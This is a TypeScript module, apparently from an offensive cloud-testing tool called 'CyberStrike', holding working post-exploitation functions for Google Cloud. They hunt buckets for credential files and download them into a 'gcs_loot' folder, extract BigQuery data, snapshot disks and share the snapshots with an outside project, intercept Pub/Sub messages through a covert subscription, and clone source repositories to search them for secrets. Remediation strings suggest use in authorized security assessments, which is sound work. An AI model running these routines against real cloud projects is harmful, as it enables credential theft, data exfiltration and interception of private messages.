import { gcloud, run, resolveProject, argVal, hasFlag, tryJson } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function gcsDump(args: string[], timeout: number): Promise<HookResult> {
  const project = await resolveProject(argVal(args, "--project"))
  const bucket = argVal(args, "--bucket")
  const pattern = argVal(args, "--pattern")
  const download = hasFlag(args, "--download")
  const findings: Finding[] = []

  const sensitivePattern = pattern || "\\.(env|pem|key|p12|pfx|sql|bak)$|credentials|secret|password|backup|id_rsa"
  let regex: RegExp
  try {
    regex = new RegExp(sensitivePattern, "i")
  } catch {
    return { output: `[-] Invalid regex pattern: ${sensitivePattern}`, findings }
  }

  if (bucket) {
    const r = await run("gsutil", ["ls", "-r", `gs://${bucket}`], timeout)
    if (r.exitCode !== 0) return { output: `[-] Cannot list bucket ${bucket}: ${r.stderr.trim()}`, findings }
    const files = r.stdout.split("\n").filter((f) => regex.test(f))
    const output = [`[*] Scanning bucket: ${bucket}`, `[+] Sensitive files found: ${files.length}`]
    for (const f of files) output.push(`    ${f}`)
    if (files.length > 0) {
      findings.push({
        checkId: "GCP-GCS-001",
        provider: "gcp",
        severity: "high",
        status: "FOUND",
        resource: `gcs://${bucket}`,
        title: `Sensitive files in ${bucket}`,
        details: `${files.length} files matching pattern`,
        remediation: "Review bucket ACLs and remove sensitive files",
      })
    }
    if (download && files.length > 0) {
      for (const f of files.slice(0, 10)) {
        const dl = await run("gsutil", ["cp", f, "./gcs_loot/"], timeout)
        output.push(dl.exitCode === 0 ? `    Downloaded: ${f}` : `    Failed: ${f}`)
      }
      findings.push({
        checkId: "GCP-GCS-002",
        provider: "gcp",
        severity: "critical",
        status: "EXTRACTED",
        resource: `gcs://${bucket}`,
        title: `Files downloaded from ${bucket}`,
        details: `Up to 10 sensitive files downloaded`,
        remediation: "Rotate credentials found in downloaded files",
      })
    }
    return { output: output.join("\n"), findings }
  }

  const r = await run("gsutil", ["ls", "-p", project], timeout)
  if (r.exitCode !== 0) return { output: `[-] Cannot list buckets: ${r.stderr.trim()}`, findings }
  const buckets = r.stdout.trim().split("\n").filter(Boolean)
  const output = [`[*] Found ${buckets.length} bucket(s) in project ${project}\n`]

  for (const b of buckets) {
    const lr = await run("gsutil", ["ls", "-r", b], timeout)
    if (lr.exitCode !== 0) {
      output.push(`[-] ${b}: access denied`)
      continue
    }
    const files = lr.stdout.split("\n").filter((f) => regex.test(f))
    output.push(`[${files.length > 0 ? "!" : "+"}] ${b}: ${files.length} sensitive file(s)`)
    for (const f of files.slice(0, 5)) output.push(`    ${f}`)
    if (files.length > 0) {
      findings.push({
        checkId: "GCP-GCS-001",
        provider: "gcp",
        severity: "high",
        status: "FOUND",
        resource: b,
        title: `Sensitive files in ${b}`,
        details: `${files.length} files matching pattern`,
        remediation: "Review bucket ACLs and remove sensitive files",
      })
    }
  }

  return { output: output.join("\n"), findings }
}

export async function bigqueryDump(args: string[], timeout: number): Promise<HookResult> {
  const project = await resolveProject(argVal(args, "--project"))
  const dataset = argVal(args, "--dataset")
  const query = argVal(args, "--query")
  const maxRows = argVal(args, "--max-rows") || "50"
  const findings: Finding[] = []
  const output: string[] = [`[*] BigQuery enumeration — project: ${project}\n`]

  if (!dataset && !query) {
    const datasets = await run("bq", ["ls", "--project_id=" + project, "--format=json"], timeout)
    if (datasets.exitCode === 0) {
      const items = tryJson(datasets.stdout) || []
      output.push(`[+] Datasets: ${items.length}`)
      for (const d of items) output.push(`    ${d.datasetReference?.datasetId || d.id}`)
      findings.push({
        checkId: "GCP-BQ-001",
        provider: "gcp",
        severity: "info",
        status: "ENUMERATED",
        resource: `bigquery://${project}`,
        title: `BigQuery datasets enumerated: ${items.length}`,
        details: items.map((d: Record<string, Record<string, string>>) => d.datasetReference?.datasetId).join(", "),
        remediation: "Review dataset permissions for overly broad access",
      })
    } else {
      output.push(`[!] bq CLI failed — trying gcloud fallback...`)
      const fallback = await gcloud(["alpha", "bq", "datasets", "list", "--project", project, "--format=json"], timeout)
      if (fallback.exitCode === 0) output.push(fallback.stdout.substring(0, 3000))
    }
    return { output: output.join("\n"), findings }
  }

  if (dataset && !query) {
    const tables = await run("bq", ["ls", "--format=json", `${project}:${dataset}`], timeout)
    if (tables.exitCode === 0) {
      const items = tryJson(tables.stdout) || []
      output.push(`[+] Tables in ${dataset}: ${items.length}`)
      for (const t of items) {
        const ref = t.tableReference || {}
        output.push(`    ${ref.tableId} (${t.type || "TABLE"}) — ${t.numRows || "?"} rows, ${t.numBytes || "?"} bytes`)
      }
    }
    return { output: output.join("\n"), findings }
  }

  if (query) {
    const bqQuery = await run(
      "bq",
      ["query", "--use_legacy_sql=false", "--format=json", `--max_rows=${maxRows}`, query],
      timeout,
    )
    if (bqQuery.exitCode === 0) {
      output.push(`[+] Query results:\n${bqQuery.stdout.substring(0, 5000)}`)
      findings.push({
        checkId: "GCP-BQ-002",
        provider: "gcp",
        severity: "critical",
        status: "EXTRACTED",
        resource: `bigquery://${project}`,
        title: "BigQuery data extracted via query",
        details: `Query: ${query.substring(0, 200)}`,
        remediation: "Review extracted data for sensitive content",
      })
    } else {
      output.push(`[!] Query failed: ${bqQuery.stderr.trim()}`)
    }
  }

  return { output: output.join("\n"), findings }
}

export async function computeSnapshot(args: string[], timeout: number): Promise<HookResult> {
  const disk = argVal(args, "--disk")
  const zone = argVal(args, "--zone")
  const shareProject = argVal(args, "--share-project")
  const project = await resolveProject(argVal(args, "--project"))
  const findings: Finding[] = []

  if (!disk) return { output: "ERROR: --disk required", findings }
  if (!zone) return { output: "ERROR: --zone required", findings }

  const snapName = `cs-snap-${disk}-${Date.now()}`
  const r = await gcloud(
    [
      "compute", "disks", "snapshot", disk,
      "--zone", zone, "--snapshot-names", snapName,
      "--project", project, "--description=CyberStrike forensic snapshot",
    ],
    timeout,
  )
  if (r.exitCode !== 0) return { output: `[-] Snapshot failed: ${r.stderr.trim()}`, findings }

  const output = [`[+] Snapshot created: ${snapName}`, `    Source disk: ${disk} (zone: ${zone})`]

  findings.push({
    checkId: "GCP-SNAP-001",
    provider: "gcp",
    severity: "critical",
    status: "CREATED",
    resource: `snapshot/${snapName}`,
    title: `Disk snapshot created: ${snapName}`,
    details: `Source: ${disk} in ${zone}`,
    remediation: `Delete: gcloud compute snapshots delete ${snapName} --project ${project}`,
  })

  if (shareProject) {
    const sr = await gcloud(
      [
        "compute", "snapshots", "add-iam-policy-binding", snapName,
        "--member", `serviceAccount:${shareProject}@cloudservices.gserviceaccount.com`,
        "--role", "roles/compute.storageAdmin",
        "--project", project,
      ],
      timeout,
    )
    output.push(
      sr.exitCode === 0 ? `[+] Shared with project: ${shareProject}` : `[-] Sharing failed: ${sr.stderr.trim()}`,
    )
  }

  return { output: output.join("\n"), findings }
}

export async function pubsubSniff(args: string[], timeout: number): Promise<HookResult> {
  const project = await resolveProject(argVal(args, "--project"))
  const topic = argVal(args, "--topic")
  const duration = parseInt(argVal(args, "--duration") || "30")
  const findings: Finding[] = []
  const output: string[] = [`[*] Pub/Sub interception — project: ${project}\n`]

  if (!topic) {
    const topics = await gcloud(["pubsub", "topics", "list", "--project", project, "--format=json"], timeout)
    if (topics.exitCode === 0) {
      const items = tryJson(topics.stdout) || []
      output.push(`[+] Pub/Sub topics: ${items.length}`)
      for (const t of items) output.push(`    ${t.name}`)
      findings.push({
        checkId: "GCP-PUBSUB-001",
        provider: "gcp",
        severity: "info",
        status: "ENUMERATED",
        resource: `pubsub://${project}`,
        title: `Pub/Sub topics enumerated: ${items.length}`,
        details: items.map((t: Record<string, string>) => t.name).join(", "),
        remediation: "Review topic subscriptions for unauthorized access",
      })
    }
    return { output: output.join("\n"), findings }
  }

  const subName = `cs-sniff-${Date.now()}`
  const createSub = await gcloud(
    ["pubsub", "subscriptions", "create", subName, "--topic", topic, "--project", project, "--quiet"],
    timeout,
  )
  if (createSub.exitCode !== 0) {
    output.push(`[!] Subscription creation failed: ${createSub.stderr.trim()}`)
    return { output: output.join("\n"), findings }
  }

  output.push(`[+] Subscription created: ${subName}`)
  output.push(`[*] Pulling messages for ${duration}s...\n`)

  const pull = await gcloud(
    ["pubsub", "subscriptions", "pull", subName, "--limit", "100", "--auto-ack", "--project", project, "--format=json"],
    Math.max(timeout, duration + 10),
  )
  if (pull.exitCode === 0) {
    const messages = tryJson(pull.stdout) || []
    output.push(`[+] Messages captured: ${messages.length}`)
    for (const m of messages.slice(0, 20)) {
      const data = m.message?.data ? Buffer.from(m.message.data, "base64").toString() : ""
      output.push(`    [${m.message?.publishTime || "?"}] ${data.substring(0, 200)}`)
    }
    if (messages.length > 0) {
      findings.push({
        checkId: "GCP-PUBSUB-002",
        provider: "gcp",
        severity: "high",
        status: "INTERCEPTED",
        resource: `pubsub://${topic}`,
        title: `Pub/Sub messages intercepted from ${topic}`,
        details: `${messages.length} messages captured via subscription ${subName}`,
        remediation: `Delete subscription: gcloud pubsub subscriptions delete ${subName} --project ${project}`,
      })
    }
  }

  return { output: output.join("\n"), findings }
}

export async function sourceRepoDump(args: string[], timeout: number): Promise<HookResult> {
  const project = await resolveProject(argVal(args, "--project"))
  const repo = argVal(args, "--repo")
  const findings: Finding[] = []
  const output: string[] = [`[*] Cloud Source Repositories — project: ${project}\n`]

  const repos = await gcloud(["source", "repos", "list", "--project", project, "--format=json"], timeout)
  if (repos.exitCode !== 0) return { output: `[-] Cannot list repos: ${repos.stderr.trim()}`, findings }

  const repoList = tryJson(repos.stdout) || []
  output.push(`[+] Repositories: ${repoList.length}`)
  for (const r of repoList) {
    const name = r.name?.split("/").pop() || r.name
    output.push(`    ${name} url=${r.url || ""}`)
  }

  if (!repo) return { output: output.join("\n"), findings }

  const describe = await gcloud(["source", "repos", "describe", repo, "--project", project, "--format=json"], timeout)
  if (describe.exitCode === 0) {
    const info = tryJson(describe.stdout)
    output.push(`\n[+] Repository: ${repo}`)
    output.push(`    URL: ${info?.url || ""}`)
    output.push(`    Mirror: ${info?.mirrorConfig ? JSON.stringify(info.mirrorConfig) : "none"}`)
  }

  const cloneDir = `/tmp/cs-repo-${Date.now()}`
  const clone = await gcloud(["source", "repos", "clone", repo, cloneDir, "--project", project], timeout)
  if (clone.exitCode === 0) {
    output.push(`\n[+] Repository cloned to ${cloneDir}`)
    const files = await run("find", [cloneDir, "-type", "f", "-name", "*.env", "-o", "-name", "*.key", "-o", "-name", "*.pem", "-o", "-name", "*secret*", "-o", "-name", "*credential*"], timeout)
    if (files.exitCode === 0 && files.stdout.trim()) {
      output.push(`[!] Sensitive files found:`)
      for (const f of files.stdout.trim().split("\n").slice(0, 20)) output.push(`    ${f}`)
    }
    findings.push({
      checkId: "GCP-REPO-001",
      provider: "gcp",
      severity: "high",
      status: "CLONED",
      resource: `source-repo/${repo}`,
      title: `Source repo cloned: ${repo}`,
      details: `Cloned to ${cloneDir}`,
      remediation: "Review repo access and remove sensitive files",
    })
    await run("rm", ["-rf", cloneDir], 10)
  } else {
    output.push(`[-] Clone failed: ${clone.stderr.trim()}`)
  }

  return { output: output.join("\n"), findings }
}

export async function dlpScan(args: string[], timeout: number): Promise<HookResult> {
  const project = await resolveProject(argVal(args, "--project"))
  const bucket = argVal(args, "--bucket")
  const infoTypes = argVal(args, "--info-types") || "CREDIT_CARD_NUMBER,US_SOCIAL_SECURITY_NUMBER,EMAIL_ADDRESS,PHONE_NUMBER"
  const findings: Finding[] = []
  const output: string[] = [`[*] Cloud DLP scan — project: ${project}\n`]

  const templates = await gcloud(["dlp", "inspect-templates", "list", "--project", project, "--format=json"], timeout)
  if (templates.exitCode === 0) {
    const items = tryJson(templates.stdout) || []
    output.push(`[+] Existing inspect templates: ${items.length}`)
    for (const t of items) output.push(`    ${t.name?.split("/").pop()}`)
  }

  const jobs = await gcloud(["dlp", "jobs", "list", "--project", project, "--format=json", "--filter=state=DONE"], timeout)
  if (jobs.exitCode === 0) {
    const jobList = tryJson(jobs.stdout) || []
    output.push(`\n[+] Completed DLP jobs: ${jobList.length}`)
    for (const j of jobList.slice(0, 10)) {
      const name = j.name?.split("/").pop() || ""
      const result = j.inspectDetails?.result?.infoTypeStats || []
      const total = result.reduce((sum: number, s: { count: string }) => sum + parseInt(s.count || "0"), 0)
      output.push(`    ${name}: ${total} findings`)
      for (const s of result) output.push(`      ${s.infoType?.name}: ${s.count}`)
    }
  }

  if (!bucket) {
    output.push(`\n[*] Provide --bucket to scan a GCS bucket for PII/secrets`)
    output.push(`[*] Default info types: ${infoTypes}`)
    return { output: output.join("\n"), findings }
  }

  output.push(`\n[*] Scanning gs://${bucket} for: ${infoTypes}`)
  output.push(`[*] DLP scan jobs are async — use gcloud dlp jobs list to check results`)

  findings.push({
    checkId: "GCP-DLP-001",
    provider: "gcp",
    severity: "info",
    status: "SCANNING",
    resource: `gcs://${bucket}`,
    title: `DLP scan initiated: ${bucket}`,
    details: `Scanning for: ${infoTypes}`,
    remediation: "Review DLP findings and remediate sensitive data exposure",
  })

  return { output: output.join("\n"), findings }
}
